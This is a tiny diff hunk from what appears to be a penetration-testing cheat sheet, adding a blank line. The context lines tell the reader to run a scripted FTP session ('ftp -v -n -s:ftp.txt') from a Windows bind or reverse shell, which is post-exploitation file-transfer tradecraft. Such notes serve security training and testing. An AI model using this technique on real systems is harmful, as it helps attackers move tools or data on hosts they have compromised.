@@ -36,5 +36,6 @@ echo bye>> ftp.txt
 ```
 Now in your Windows bind/reverse shell run the ftp.txt file
 `ftp -v -n -s:ftp.txt`
+
 ---
 
